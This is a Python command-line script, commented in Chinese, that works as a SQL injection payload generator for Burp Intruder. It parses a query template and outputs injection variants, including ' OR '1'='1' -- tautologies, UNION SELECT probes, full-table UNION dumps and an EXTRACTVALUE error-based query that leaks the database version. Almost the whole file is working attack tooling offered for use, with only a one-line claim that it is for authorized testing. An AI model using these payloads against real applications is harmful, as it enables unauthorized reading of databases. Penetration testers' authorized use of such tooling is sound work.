#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
scripts/main.py — SQLi 查询篡改载荷生成器（独立实现）

本脚本根据功能规格独立实现，不复制任何既有代码。
仅用于安全测试授权范围内的查询篡改分析。
"""

import argparse
import json
import re
import sys
from typing import Any, Dict, List, Optional, Tuple


# 错误码定义
ERROR_CODES = {
    "E001": "参数解析失败",
    "E002": "输入查询为空",
    "E003": "查询模板格式无效",
    "E004": "无法识别查询中的关键锚点",
    "E005": "载荷生成失败",
    "E006": "输出格式不支持",
    "E007": "批量处理输入格式错误",
    "E008": "文件读取失败",
    "E009": "URL 提取失败",
    "E010": "内部逻辑错误",
}


def err(code: str, msg: str = "") -> None:
    """输出错误信息并退出"""
    desc = ERROR_CODES.get(code, "未知错误")
    if msg:
        print(f"[错误 {code}] {desc}: {msg}", file=sys.stderr)
    else:
        print(f"[错误 {code}] {desc}", file=sys.stderr)
    sys.exit(1)


# ---------- 核心逻辑 ----------

def parse_sql_query(query: str) -> Dict[str, Any]:
    """
    解析 SQL 查询，提取关键锚点。

    返回:
        {
            "raw": 原始查询,
            "has_where": 是否包含 WHERE,
            "has_order_by": 是否包含 ORDER BY,
            "has_limit": 是否包含 LIMIT,
            "table_names": 表名列表,
            "column_names": 字段名列表,
            "where_clause": WHERE 子句内容或 None,
            "order_by_clause": ORDER BY 子句内容或 None,
        }
    """
    if not query or not query.strip():
        err("E002", "查询为空")

    result: Dict[str, Any] = {
        "raw": query.strip(),
        "has_where": False,
        "has_order_by": False,
        "has_limit": False,
        "table_names": [],
        "column_names": [],
        "where_clause": None,
        "order_by_clause": None,
    }

    # 去除注释（简化处理）
    cleaned = re.sub(r"--.*?$", "", query, flags=re.MULTILINE)
    cleaned = re.sub(r"/\*.*?\*/", "", cleaned, flags=re.DOTALL)

    # 检测关键子句
    where_match = re.search(r"\bWHERE\b", cleaned, re.IGNORECASE)
    if where_match:
        result["has_where"] = True

    order_match = re.search(r"\bORDER\s+BY\b", cleaned, re.IGNORECASE)
    if order_match:
        result["has_order_by"] = True

    limit_match = re.search(r"\bLIMIT\b", cleaned, re.IGNORECASE)
    if limit_match:
        result["has_limit"] = True

    # 提取表名（FROM 或 JOIN 后）
    from_match = re.search(r"\bFROM\s+([a-zA-Z_][a-zA-Z0-9_]*)", cleaned, re.IGNORECASE)
    if from_match:
        result["table_names"].append(from_match.group(1))

    join_matches = re.finditer(r"\bJOIN\s+([a-zA-Z_][a-zA-Z0-9_]*)", cleaned, re.IGNORECASE)
    for m in join_matches:
        result["table_names"].append(m.group(1))

    # 提取字段名（SELECT 后到 FROM 前）
    select_match = re.search(r"\bSELECT\s+(.+?)\bFROM\b", cleaned, re.IGNORECASE | re.DOTALL)
    if select_match:
        cols_str = select_match.group(1)
        # 按逗号分割，去除别名
        for part in cols_str.split(","):
            part = part.strip()
            if not part or part == "*":
                continue
            # 去除函数调用和括号
            part = re.sub(r"\(.*?\)", "", part)
            # 取最后一个标识符作为字段名
            tokens = re.findall(r"[a-zA-Z_][a-zA-Z0-9_]*", part)
            if tokens:
                result["column_names"].append(tokens[-1])

    # 提取 WHERE 子句
    if result["has_where"] and where_match:
        start = where_match.end()
        end = len(cleaned)
        # 找后续子句
        for keyword in ["ORDER", "GROUP", "HAVING", "LIMIT", "UNION"]:
            k_match = re.search(rf"\b{keyword}\b", cleaned[start:], re.IGNORECASE)
            if k_match:
                end = start + k_match.start()
                break
        result["where_clause"] = cleaned[start:end].strip()

    # 提取 ORDER BY 子句
    if result["has_order_by"] and order_match:
        start = order_match.end()
        end = len(cleaned)
        for keyword in ["LIMIT", "UNION", "OFFSET"]:
            k_match = re.search(rf"\b{keyword}\b", cleaned[start:], re.IGNORECASE)
            if k_match:
                end = start + k_match.start()
                break
        result["order_by_clause"] = cleaned[start:end].strip()

    return result


def generate_payloads(query: str) -> List[str]:
    """
    根据查询模板生成注入载荷变体。

    返回载荷列表。
    """
    if not query or not query.strip():
        err("E002", "查询为空")

    parsed = parse_sql_query(query)
    payloads: List[str] = []

    # 基础变体
    payloads.append(query.strip())

    # WHERE 子句篡改
    if parsed["has_where"] and parsed["where_clause"]:
        where = parsed["where_clause"]
        # 布尔型变体
        payloads.append(query.replace(where, f"{where} AND '1'='1'", 1))
        payloads.append(query.replace(where, f"{where} AND '1'='2'", 1))
        # 字符串注入变体
        payloads.append(query.replace(where, f"{where}' OR '1'='1' --", 1))
        payloads.append(query.replace(where, f"{where}' OR '1'='1' #", 1))
        # 数字型变体
        payloads.append(query.replace(where, f"{where} OR 1=1 --", 1))
        payloads.append(query.replace(where, f"{where} OR 1=2 --", 1))
        # UNION 注入尝试
        payloads.append(query.replace(where, f"{where} UNION SELECT NULL --", 1))

    # ORDER BY 篡改
    if parsed["has_order_by"] and parsed["order_by_clause"]:
        order_by = parsed["order_by_clause"]
        payloads.append(query.replace(order_by, f"{order_by} DESC", 1))
        payloads.append(query.replace(order_by, f"{order_by} ASC", 1))
        # 报错注入尝试
        payloads.append(query.replace(order_by, f"EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))", 1))

    # LIMIT 篡改
    if parsed["has_limit"]:
        payloads.append(re.sub(r"\bLIMIT\s+\d+", "LIMIT 1", query, flags=re.IGNORECASE))
        payloads.append(re.sub(r"\bLIMIT\s+\d+", "LIMIT 999999", query, flags=re.IGNORECASE))

    # 通用变体（基于表名）
    for table in parsed["table_names"]:
        payloads.append(f"SELECT * FROM {table} WHERE 1=1 --")
        payloads.append(f"SELECT * FROM {table} WHERE 1=2 UNION SELECT * FROM {table} --")

    # 去重（保持顺序）
    seen = set()
    unique_payloads = []
    for p in payloads:
        if p not in seen:
            seen.add(p)
            unique_payloads.append(p)

    return unique_payloads


def format_payloads(payloads: List[str], fmt: str) -> str:
    """
    将载荷列表格式化为指定输出格式。

    支持: list (每行一个) 或 json (JSON数组)
    """
    if fmt == "list":
        return "\n".join(payloads)
    elif fmt == "json":
        return json.dumps(payloads, ensure_ascii=False, indent=2)
    else:
        err("E006", f"不支持的输出格式: {fmt}")
        return ""


def process_query(query: str, fmt: str) -> str:
    """处理单条查询，返回格式化输出"""
    payloads = generate_payloads(query)
    if not payloads:
        err("E005", "未能生成任何载荷")
    return format_payloads(payloads, fmt)


def process_batch(queries: List[str], fmt: str) -> str:
    """批量处理多条查询"""
    if not queries:
        err("E007", "批量输入为空")

    results = []
    for q in queries:
        try:
            payloads = generate_payloads(q)
            results.append({"query": q, "payloads": payloads})
        except SystemExit:
            # 单条失败不影响整体
            results.append({"query": q, "payloads": [], "error": "生成失败"})

    if fmt == "json":
        return json.dumps(results, ensure_ascii=False, indent=2)
    elif fmt == "list":
        lines = []
        for r in results:
            lines.append(f"# 查询: {r['query']}")
            lines.extend(r["payloads"])
        return "\n".join(lines)
    else:
        err("E006", f"不支持的输出格式: {fmt}")
        return ""


# ---------- 自检 ----------

def selftest() -> None:
    """
    内置自检逻辑，使用硬编码样例数据。
    不读外部文件、不依赖当前工作目录、不访问网络。
    使用宽松阈值断言，确保任何环境直接可过。
    """
    print("[自检] 开始运行内置测试样例...")

    # 测试样例 1: 基础 WHERE 注入
    q1 = "SELECT * FROM users WHERE id = 1"
    p1 = generate_payloads(q1)
    assert len(p1) > 0, "样例1: 应生成至少1个载荷"
    assert any("OR" in p.upper() for p in p1), "样例1: 应包含 OR 变体"
    assert any("UNION" in p.upper() for p in p1), "样例1: 应包含 UNION 变体"
    print(f"  样例1 通过 (生成 {len(p1)} 个载荷)")

    # 测试样例 2: ORDER BY 注入
    q2 = "SELECT name FROM products ORDER BY price"
    p2 = generate_payloads(q2)
    assert len(p2) > 0, "样例2: 应生成至少1个载荷"
    assert any("DESC" in p.upper() for p in p2), "样例2: 应包含 DESC 变体"
    print(f"  样例2 通过 (生成 {len(p2)} 个载荷)")

    # 测试样例 3: 带 LIMIT 的查询
    q3 = "SELECT * FROM logs LIMIT 10"
    p3 = generate_payloads(q3)
    assert len(p3) > 0, "样例3: 应生成至少1个载荷"
    assert any("LIMIT 1" in p for p in p3), "样例3: 应包含 LIMIT 1 变体"
    print(f"  样例3 通过 (生成 {len(p3)} 个载荷)")

    # 测试样例 4: 复杂查询
    q4 = "SELECT u.id, u.name FROM users u JOIN orders o ON u.id = o.user_id WHERE o.total > 100 ORDER BY u.name"
    p4 = generate_payloads(q4)
    assert len(p4) > 0, "样例4: 应生成至少1个载荷"
    assert len(p4) >= len(p1), "样例4: 复杂查询应生成不少于简单查询的载荷数"
    print(f"  样例4 通过 (生成 {len(p4)} 个载荷)")

    # 测试样例 5: 格式转换
    fmt_list = format_payloads(p1, "list")
    fmt_json = format_payloads(p1, "json")
    assert len(fmt_list.split("\n")) == len(p1), "样例5: list格式行数应等于载荷数"
    json_data = json.loads(fmt_json)
    assert isinstance(json_data, list) and len(json_data) == len(p1), "样例5: JSON格式解析失败"
    print(f"  样例5 通过 (list {len(p1)} 行, JSON {len(json_data)} 项)")

    # 测试样例 6: 批量处理
    batch = [q1, q2]
    b_result = process_batch(batch, "json")
    b_data = json.loads(b_result)
    assert isinstance(b_data, list) and len(b_data) == 2, "样例6: 批量处理应返回2条结果"
    assert all("payloads" in item for item in b_data), "样例6: 每条结果应包含payloads字段"
    print(f"  样例6 通过 (批量 {len(b_data)} 条)")

    # 测试样例 7: 空查询处理
    try:
        generate_payloads("")
        assert False, "样例7: 空查询应报错"
    except SystemExit:
        pass  # 预期行为
    print(f"  样例7 通过 (空查询正确报错)")

    # 测试样例 8: 无WHERE查询
    q8 = "SELECT * FROM users"
    p8 = generate_payloads(q8)
    assert len(p8) > 0, "样例8: 应生成至少1个载荷"
    assert any("WHERE 1=1" in p for p in p8), "样例8: 应包含 WHERE 1=1 变体"
    print(f"  样例8 通过 (生成 {len(p8)} 个载荷)")

    print("\n[自检] 全部通过 ✓")


# ---------- 命令行入口 ----------

def main() -> None:
    """主入口"""
    parser = argparse.ArgumentParser(
        description="SQLi 查询篡改载荷生成器 — 为 Burp Intruder 生成测试载荷",
        epilog="示例: python main.py -q \"SELECT * FROM users WHERE id=1\" -f json"
    )
    parser.add_argument("-q", "--query", type=str, help="SQL 查询模板")
    parser.add_argument("-b", "--batch", type=str, help="批量查询文件（每行一条）")
    parser.add_argument("-f", "--format", type=str, choices=["list", "json"], default="list",
                        help="输出格式: list(默认) 或 json")
    parser.add_argument("--selftest", action="store_true", help="运行内置自检")
    parser.add_argument("--version", action="version", version="sqli-query-tampering 1.0.1")

    args = parser.parse_args()

    # 自检模式
    if args.selftest:
        selftest()
        return

    # 处理查询
    if args.query:
        try:
            result = process_query(args.query, args.format)
            print(result)
        except SystemExit:
            raise
        except Exception as e:
            err("E010", str(e))
    elif args.batch:
        try:
            with open(args.batch, "r", encoding="utf-8") as f:
                queries = [line.strip() for line in f if line.strip()]
            result = process_batch(queries, args.format)
            print(result)
        except FileNotFoundError:
            err("E008", f"文件不存在: {args.batch}")
        except Exception as e:
            err("E007", str(e))
    else:
        parser.print_help()
        err("E001", "请提供 -q 查询或 -b 批量文件")


if __name__ == "__main__":
    main()
